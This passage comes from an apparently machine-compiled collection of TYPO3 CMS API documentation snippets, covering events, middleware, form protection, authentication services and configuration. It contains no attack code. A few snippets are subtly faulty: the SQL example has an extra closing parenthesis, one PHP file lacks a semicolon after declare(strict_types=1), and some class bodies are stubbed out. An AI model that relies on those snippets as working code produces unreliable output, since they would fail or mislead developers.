'TYPO3/CMS/Backend/ActionButton/ImmediateAction'\n], function(Notification, ImmediateAction) {\n  'use strict';\n\n  Notification.info(\n    'Update required', \n    'The system requires an update.',\n    0,\n    [\n      {\n        label: 'Execute update',\n        action: new ImmediateAction(() => {\n          window.location.href = 'update.php';\n        })\n      }\n    ]\n  );\n});\n\n```\n\n----------------------------------------\n\nTITLE: Getting Specific Link Handler in TYPO3 CMS\nDESCRIPTION: This method retrieves an individual link handler by its name. It returns the handler definition or null if not defined. The name parameter should include a trailing period.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkHandlersEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getLinkHandler(string $name)\n    :returns: `array<string,mixed>|null`\n\n    Gets an individual handler by name.\n\n    :param $name: The handler name, including trailing period.\n    :Return description: The handler definition, or null if not defined.\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLoginFormViewEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the ModifyLoginFormViewEvent class in the TYPO3\\CMS\\FrontendLogin\\Event namespace. It includes methods to get and set view variables for the login form.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/ModifyLoginFormViewEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class ModifyLoginFormViewEvent\n{\n    private array $loginFormVariables;\n\n    public function __construct(array $loginFormVariables)\n    {\n        $this->loginFormVariables = $loginFormVariables;\n    }\n\n    public function getLoginFormVariables(): array\n    {\n        return $this->loginFormVariables;\n    }\n\n    public function setLoginFormVariables(array $loginFormVariables): void\n    {\n        $this->loginFormVariables = $loginFormVariables;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Tag Value Object in TYPO3\nDESCRIPTION: Defines a final Tag class that extends AbstractValueObject with a name property. The class provides a constructor for initialization and a getter method for accessing the tag name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/AbstractValueObject.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class Tag extends AbstractValueObject\n{\n    private string $name = '';\n\n    public function __construct(string $name = '')\n    {\n        $this->name = $name;\n    }\n\n    public function getName(): string\n    {\n        return $this->name;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLoginFormViewEvent Class in TYPO3 Frontend Login Extension\nDESCRIPTION: The ModifyLoginFormViewEvent class provides an interface for modifying the login form view in TYPO3's frontend. It exposes methods to get the view object and the server request, allowing extensions to customize the login form by injecting custom variables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/ModifyLoginFormViewEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\FrontendLogin\\Event\n\n..  php:class:: ModifyLoginFormViewEvent\n\n    Allows to inject custom variables into the login form.\n\n    ..  php:method:: getView()\n        :returns: `\\TYPO3\\CMS\\Core\\View\\ViewInterface`\n\n    ..  php:method:: getRequest()\n        :returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\n----------------------------------------\n\nTITLE: Validating Form Token During Form Submission\nDESCRIPTION: Shows how to validate a submitted form token when processing form data, with appropriate error handling for invalid tokens.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormProtection/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nif ($dataHasBeenSubmitted &&\n    $formProtection->validateToken(\n        $request->getParsedBody()['formToken'] ?? '',\n        'BE user setup',\n        'edit'\n    ) ) {\n    // process the data\n} else {\n    // No need to do anything here, as the backend form protection will\n    // create a flash message for an invalid token\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterPagePreviewUriGeneratedEvent Class Methods\nDESCRIPTION: Class definition providing methods to handle page preview URI generation events in TYPO3 CMS. The class includes methods for manipulating preview URIs and accessing related page information like page ID, language ID, rootline, and additional parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterPagePreviewUriGeneratedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Routing\\Event\n\n..  php:class:: AfterPagePreviewUriGeneratedEvent\n\n    ..  php:method:: setPreviewUri(\\Psr\\Http\\Message\\UriInterface $previewUri)\n\n        :param $previewUri: the previewUri\n\n    ..  php:method:: getPreviewUri()\n        :returns: `\\Psr\\Http\\Message\\UriInterface`\n\n    ..  php:method:: getPageId()\n        :returns: `int`\n\n    ..  php:method:: getLanguageId()\n        :returns: `int`\n\n    ..  php:method:: getRootline()\n        :returns: `array`\n\n    ..  php:method:: getSection()\n        :returns: `string`\n\n    ..  php:method:: getAdditionalQueryParameters()\n        :returns: `array`\n\n    ..  php:method:: getContext()\n        :returns: `\\TYPO3\\CMS\\Core\\Context\\Context`\n\n    ..  php:method:: getOptions()\n        :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Configuring Request Middlewares in PHP for TYPO3\nDESCRIPTION: This code snippet demonstrates the structure of the `Configuration/RequestMiddlewares.php` file within a TYPO3 extension. It shows how to define middleware configurations for both the frontend and backend, including specifying the class, before, and after keys for each middleware. The configuration allows for adding, disabling, and ordering middleware components.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/RequestMiddlewaresPhp.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nreturn [\n    'frontend' => [\n        'example/middleware' => [\n            'target' => Your\\Vendor\\Middleware\\ExampleMiddleware::class,\n            'before' => [\n                'typo3/cms-frontend/base-middleware',\n            ],\n            'after' => [\n                'typo3/cms-frontend/output-compression',\n            ],\n        ],\n        'example/disable-middleware' => [\n            'disabled' => true,\n        ],\n    ],\n    'backend' => [\n        'example/backend-middleware' => [\n            'target' => Your\\Vendor\\Middleware\\BackendMiddleware::class,\n            'before' => [\n                'typo3/cms-backend/authentication',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileMovedEvent Class in TYPO3 CMS Core Resource\nDESCRIPTION: This class represents an event that triggers after a file has been moved to a different folder. It provides access to the file object, the target folder, and the original folder. This event can be used by custom third-party handlers that need to respond to path changes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMovedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileMovedEvent\n{\n    // This event is fired after a file was moved within a Resource Storage / Driver.\n    // The folder represents the \"target folder\".\n    // Examples: Use this to update custom third party handlers that rely on specific paths.\n    \n    public function getFile()\n    {\n        // Returns the file object that was moved\n        // :returns: \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    }\n    \n    public function getFolder()\n    {\n        // Returns the target folder\n        // :returns: \\TYPO3\\CMS\\Core\\Resource\\Folder\n    }\n    \n    public function getOriginalFolder()\n    {\n        // Returns the original folder the file was in before moving\n        // :returns: \\TYPO3\\CMS\\Core\\Resource\\FolderInterface\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Authentication Service Chain with Return Value Processing\nDESCRIPTION: Shows how to process authentication services in a chain with specific return value handling. Services can return different status codes to control the authentication flow, with values >= 200 indicating immediate authentication success.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/ServiceChain.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nforeach ($tempuserArr as $tempuser) {\n   // Use 'auth' service to authenticate the user.\n   // If one service returns FALSE then authentication fails.\n   // A service may return 100 which means there's no reason to stop but the\n   // user can't be authenticated by that service.\n   $this->logger->debug('Auth user', $tempuser);\n   $subType = 'authUser' . $this->loginType;\n\n   foreach ($this->getAuthServices($subType, $loginData, $authInfo) as $serviceObj) {\n      if (($ret = $serviceObj->authUser($tempuser)) > 0) {\n         // If the service returns >=200 then no more checking is needed.\n         // This is useful for IP checking without password.\n         if ((int)$ret >= 200) {\n            $authenticated = true;\n            break;\n         }\n         if ((int)$ret >= 100) {\n         } else {\n            $authenticated = true;\n         }\n      } else {\n         $authenticated = false;\n         break;\n      }\n   }\n\n   if ($authenticated) {\n      // Leave foreach() because a user is authenticated\n      break;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Variables in PHP\nDESCRIPTION: This snippet demonstrates the recommended camelCase naming convention for PHP variables and identifiers in TYPO3, avoiding underscores and unnecessary abbreviations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$goodName\n$anotherGoodName\n```\n\n----------------------------------------\n\nTITLE: Resulting SQL Query with Limited Restrictions\nDESCRIPTION: The SQL query generated when limiting restrictions to the 'c2' table alias. The hidden restriction is only applied to the c2 table in the WHERE clause.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"c1\".*\n  FROM \"tt_content\" \"c1\"\n  LEFT JOIN \"tt_content\" \"c2\" ON c1.parent_field = c2.uid\n  WHERE ((\"c2\".\"uid\" IS NULL) OR (\"c2\".\"pid\" = 1))\n    AND (\"c2\".\"hidden\" = 0))\n```\n\n----------------------------------------\n\nTITLE: Comparing Tag-Based and Inline Notation in Fluid\nDESCRIPTION: Shows the difference between tag-based and inline notation for the same ViewHelper functionality in Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<!-- tag based notation -->\n<f:translate key=\"LLL:EXT:core/Resources/Private/Language/locallang_misc.xlf:bookmark_inactive\"/>\n\n<!-- inline notation -->\n{f:translate(key: 'LLL:EXT:core/Resources/Private/Language/locallang_misc.xlf:bookmark_inactive')}\n```\n\n----------------------------------------\n\nTITLE: Setting Content Security Policy Reporting URL in TYPO3 Backend\nDESCRIPTION: This snippet shows how to configure the reporting HTTP endpoint for Content Security Policy violations in the TYPO3 backend using the `$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl']` configuration. It also demonstrates how to disable Content Security Policy reporting by setting the value to `'0'`. Site-specific configurations in `config/sites/my_site/csp.yaml` take precedence over the global configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n\"// Set a custom endpoint for Content Security Policy reporting\n$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl']\n    = 'https://csp-violation.example.org/';\"\n```\n\nLANGUAGE: php\nCODE:\n```\n\"// Disables Content Security Policy reporting\n$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl'] = '0';\"\n```\n\n----------------------------------------\n\nTITLE: Implementing a BeforePagePreviewUriGeneratedEvent Listener in TYPO3\nDESCRIPTION: This example shows how to implement an event listener for the BeforePagePreviewUriGeneratedEvent to modify the page preview URI generation process. The listener can adjust parameters like page ID and language ID or set a custom preview URI.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforePagePreviewUriGeneratedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Routing\\Event\\BeforePagePreviewUriGeneratedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforePagePreviewUriGeneratedEvent $event): void\n    {\n        // Set a complete custom URI, which will stop the event propagation and also\n        // prevents TYPO3\\CMS\\Backend\\Routing\\PreviewUriBuilder from building the\n        // Preview URI on its own.\n        // $event->setPreviewUri('https://example.org');\n\n        // Or change one or multiple parameter which will be used for building\n        // the preview URI.\n        $event->setPageId(123);\n        $event->setLanguageId(2);\n        $event->setSection('c123');\n        $event->setType(1551338925);\n        $event->setRootLine([['uid' => 123, 'pid' => 0]]);\n        $event->setParameters(['foo' => 'bar']);\n        $event->setAdditionalQueryParameters(['baz' => 'bar']);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Modifying Global Configuration in TYPO3 Additional Settings\nDESCRIPTION: This code example demonstrates updating the database hostname dynamically based on the application context in TYPO3. Specifically, it is used for development environments where the database host needs to differ from production setups. This PHP snippet will be executed on every request to TYPO3, thus it should be written with performance considerations to avoid any slow processing during requests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n$applicationContext = \\TYPO3\\CMS\\Core\\Core\\Environment::getContext();\nif ($applicationContext->isDevelopment()) {\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['host'] = 'mysql-be';\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterRecordSummaryForLocalizationEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the AfterRecordSummaryForLocalizationEvent in TYPO3 CMS. The listener modifies the payload of the JsonResponse after the record summary for localization is generated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterRecordSummaryForLocalizationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\AfterRecordSummaryForLocalizationEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterRecordSummaryForLocalizationEvent $event): void\n    {\n        $payload = $event->getPayload();\n        // Modify the payload\n        $event->setPayload($payload);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Template Paths for TYPO3 Blog Extension\nDESCRIPTION: TypoScript configuration that defines template, partial, and layout root paths for a blog extension. Sets up view configuration using path constants and defines a default PID setting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/View/TypoScript.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_blogexample {\n  view {\n    templateRootPaths.10 = {$plugin.tx_blogexample.view.templateRootPath}\n    partialRootPaths.10 = {$plugin.tx_blogexample.view.partialRootPath}\n    layoutRootPaths.10 = {$plugin.tx_blogexample.view.layoutRootPath}\n    defaultPid = auto\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing getRecordList Method in PHP\nDESCRIPTION: This method retrieves the current DatabaseRecordList instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_10\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getRecordList(): \\TYPO3\\CMS\\Backend\\RecordList\\DatabaseRecordList\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Sendmail Command\nDESCRIPTION: This snippet specifies the command used to send emails when the sendmail transport method is selected. It establishes how TYPO3 communicates with the local mail sending capabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_16\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_sendmail_command']\n:type: text\n:Default: ''\n\n*only with transport=sendmail* The command to call to send a mail locally.\n```\n\n----------------------------------------\n\nTITLE: Setting TYPO3 Application Context in Command Line\nDESCRIPTION: Command for running TYPO3 CLI commands in Development context by setting the TYPO3_CONTEXT environment variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Bootstrapping.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# run the TYPO3 CLI commands in development context\nTYPO3_CONTEXT=Development ./bin/typo3\n```\n\n----------------------------------------\n\nTITLE: RTE Display Format Example in TYPO3\nDESCRIPTION: Demonstrates how the same content is transformed for display in the Rich Text Editor, with proper paragraph wrapping and HTML formatting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Transformations/Introduction.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<p>This is line number 1 with a <a href=\"t3://page?uid=123\">link</a> inside</p>\n<p>This is line number 2 with a <strong>bold part</strong> in the text</p>\n<p align=\"center\">This line is centered.</p>\n<p>This line is just plain</p>\n```\n\n----------------------------------------\n\nTITLE: Extending an Original Extbase Repository\nDESCRIPTION: PHP class that extends the original Extbase repository. This is required even if no additional functionality is needed, as Extbase expects the repository to follow the naming convention of the model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Repository;\n\nuse OriginalVendor\\OriginalExtension\\Domain\\Repository\\SomeModelRepository;\n\nclass MyExtendedModelRepository extends SomeModelRepository\n{\n    // Add custom repository methods here\n    // or leave empty if no additional functionality is needed\n}\n\n```\n\n----------------------------------------\n\nTITLE: Retrieving Nonce Request Attribute in TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates how to retrieve the nonce attribute from a request in TYPO3 CMS. It checks if the attribute is an instance of ConsumableString and consumes it if available.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Nonce.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Domain\\ConsumableString\n\n/** @var ConsumableString|null $nonce */\n$nonceAttribute = $this->request->getAttribute('nonce');\nif ($nonceAttribute instanceof ConsumableString) {\n    $nonce = $nonceAttribute->consume();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFolderCopiedEvent Class Methods in TYPO3\nDESCRIPTION: Defines three getter methods in the BeforeFolderCopiedEvent class for accessing folder copy operation details. The methods provide access to the source folder object, target parent folder object, and the target folder name string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFolderCopiedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getFolder()\n:returns: `\\TYPO3\\CMS\\Core\\Resource\\Folder`\n\nphp:method:: getTargetParentFolder()\n:returns: `\\TYPO3\\CMS\\Core\\Resource\\Folder`\n\nphp:method:: getTargetFolderName()\n:returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyGenericBackendMessagesEvent Class Interface in TYPO3\nDESCRIPTION: PHP class definition for handling backend messages in TYPO3's 'Help > About' module. Provides methods to get, add, and set messages using TYPO3's AbstractMessage system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyGenericBackendMessagesEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass ModifyGenericBackendMessagesEvent\n{\n    public function getMessages(): array;\n    \n    public function addMessage(\\TYPO3\\CMS\\Core\\Messaging\\AbstractMessage $message);\n    \n    public function setMessages(array $messages);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Extension Configuration in Legacy TYPO3\nDESCRIPTION: This PHP snippet illustrates how to define an extension configuration using an associative array. This file is crucial for legacy TYPO3 installations as it holds essential metadata about the extension such as its constraints with TYPO3 and PHP versions, dependencies, and other configuration details critical for extension management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtEmconf.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$EM_CONF = array(\n    'extension_key' => array(\n        'title' => 'My Extension',\n        'description' => 'Short description of what the extension does',\n        'version' => '1.0.0',\n        'category' => 'plugin',\n        'state' => 'stable',\n        'author' => 'John Doe',\n        'author_email' => 'john.doe@example.com',\n        'constraints' => array(\n            'depends' => array(\n                'typo3' => '10.4 - 11.5',\n            ),\n            'conflicts' => array(\n                'some_other_extension',\n            ),\n            'suggests' => array(\n                'another_extension',\n            ),\n        ),\n    ),\n);\n?>\n```\n\n----------------------------------------\n\nTITLE: PHP SetRegistry Get Sets\nDESCRIPTION: Shows how to retrieve multiple site set definitions including their dependencies using SetRegistry.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$sets = $setRegistry->getSets('my-vendor/my-set', 'my-vendor/my-set');\n```\n\n----------------------------------------\n\nTITLE: TYPO3 File Utility Class References\nDESCRIPTION: PHP namespace references to TYPO3's core file handling utility classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Introduction/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\File\\BasicFileUtility\n```\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\File\\ExtendedFileUtility\n```\n\n----------------------------------------\n\nTITLE: Defining Tag Value Object Class in PHP\nDESCRIPTION: Defines a final Tag class that extends AbstractValueObject and implements the Stringable interface. Contains a public integer property 'priority' initialized to 0.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/ModelWithPublicProperty.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class Tag extends AbstractValueObject implements \\Stringable\n{\n\n    public int $priority = 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Clipboard Screenshot in RST Documentation\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of TYPO3 CMS clipboard items with shadow styling\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/Clipboard/ClipboardItems.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/Clipboard/ClipboardItems.png\n   :class: with-shadow\n\n   Clipboard items\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Configuration in TYPO3 CMS (PHP)\nDESCRIPTION: This snippet demonstrates how to retrieve the site object from the request attribute and access its configuration. It's applicable in both frontend and backend contexts of TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Site.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$site = $request->getAttribute('site');\n$siteConfiguration = $site->getConfiguration();\n```\n\n----------------------------------------\n\nTITLE: Extending Page Tree Search Filter in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet demonstrates how to create an event listener class that adds additional conditions to the page tree filter in TYPO3 CMS. It evaluates document types as part of the search filter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforePageTreeIsFilteredEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1)\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Tree\\Repository\\BeforePageTreeIsFilteredEvent;\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\n\n#[AsEventListener]\nfinal class MyEventListener\n{\n    public function __invoke(BeforePageTreeIsFilteredEvent $event): void\n    {\n        $queryBuilder = $event->getQueryBuilder();\n        $expr = $queryBuilder->expr();\n\n        $searchParts = $event->getSearchParts();\n        $searchPhrase = $event->getSearchPhrase();\n\n        // Add search for specific document types\n        $documentTypes = ['article', 'blog', 'news'];\n        if (in_array($searchPhrase, $documentTypes, true)) {\n            $searchParts[] = $expr->eq('doktype', 1);\n            $searchParts[] = $expr->eq('backend_layout', $searchPhrase);\n        }\n\n        $event->setSearchParts($searchParts);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Radio-style DropDown Items in TYPO3\nDESCRIPTION: This snippet demonstrates how to create radio-style dropdown items in TYPO3 backend. It creates two mutually exclusive options (list and tiles views) where one is set as active. When active, a radio item displays a dot indicator next to it.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$item = GeneralUtility::makeInstance(DropDownRadio::class)\n    ->setHref('#')\n    ->setActive(true)\n    ->setLabel('My label')\n    ->setTitle('My title')\n    ->setIcon($this->iconFactory->getIcon('actions-viewmode-list'))\n    ->setAttributes(['data-type' => 'list']);\n$dropDownButton->addItem($item);\n\n$item = GeneralUtility::makeInstance(DropDownRadio::class)\n    ->setHref('#')\n    ->setActive(false)\n    ->setLabel('Tiles')\n    ->setTitle('Tiles')\n    ->setIcon($this->iconFactory->getIcon('actions-viewmode-tiles'))\n    ->setAttributes(['data-type' => 'tiles']);\n$dropDownButton->addItem($item);\n```\n\n----------------------------------------\n\nTITLE: Overriding Service Registration in TYPO3 CMS ext_localconf.php\nDESCRIPTION: This code snippet demonstrates how to override the priority of a service registration in TYPO3 CMS. It modifies the 'priority' value for the 'sv' service of type 'auth' to 80.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/RegistrationChanges.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['T3_SERVICES']['auth']['sv']['priority'] = 80;\n```\n\n----------------------------------------\n\nTITLE: Assigning Identifier Value with TypoScript\nDESCRIPTION: This code snippet demonstrates the use of TypoScript to assign a text value to an identifier. It utilizes `stdWrap.field` to set the field title and employs `stdWrap.ifEmpty.data` with a fallback to the level title as a default value if the primary field is empty. No external dependencies are required.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlock2.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\nmyIdentifier {\n   stdWrap.field = title\n   stdWrap.ifEmpty.data = leveltitle:0\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Extbase Plugin in TYPO3 CMS\nDESCRIPTION: This snippet demonstrates the use of configurePlugin() method in ext_localconf.php file to configure an Extbase plugin in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CreatePlugins.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nconfigurePlugin()\n```\n\n----------------------------------------\n\nTITLE: Configuring Table of Contents for TYPO3 Administration Documentation\nDESCRIPTION: This snippet sets up a hidden table of contents for the TYPO3 administration documentation. It includes links to various subsections such as Installation, Directory Structure, Upgrade, System Settings, User Management, and Troubleshooting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :hidden:\n    :glob:\n\n    Installation/Index\n    DirectoryStructure/Index\n    Upgrade/Index\n    SystemSettings/Index\n    UserManagement/Index\n    Troubleshooting/Index\n    */Index\n    *\n```\n\n----------------------------------------\n\nTITLE: Registering Frontend Module in Extbase\nDESCRIPTION: Example configuration for registering a frontend plugin in Extbase using UpperCamelCase notation for the extension key.\nSOURCE: 